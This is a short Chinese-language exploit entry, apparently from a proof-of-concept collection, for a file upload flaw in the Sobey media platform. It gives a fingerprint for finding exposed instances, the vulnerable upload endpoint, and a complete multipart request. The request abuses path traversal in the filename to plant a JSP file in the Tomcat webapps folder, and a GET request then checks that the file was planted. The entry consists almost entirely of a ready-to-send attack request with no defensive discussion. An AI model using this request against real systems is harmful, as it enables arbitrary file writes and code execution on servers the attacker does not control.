# 索贝融媒体系统Upload存在文件上传漏洞

- **系统**：索贝融媒体系统　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="/Sc-TaskMonitoring/"`
- **请求**：`POST /sobey-mchEditor/watermark/upload HTTP/1.1`
- **关键头**：`Content-Length: 350`　`Content-Type: multipart/form-data; boundary=----WebKitFormBoundary2MPk8Dnb…`

**请求体 / payload**
```
------WebKitFormBoundary2MPk8DnbXZiTAx15
Content-Disposition: form-data; name="file"; filename="../../../../../../../../../usr/local/tomcat/webapps/sobey-mchEditor/123.jsp"
Content-Type: image/jpeg
<% out.print("test"); new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
------WebKitFormBoundary2MPk8DnbXZiTAx15--
**访问**
GET /sobey-mchEditor/123.jsp HTTP/1.1
Host:
```
- **预期**：200　|　—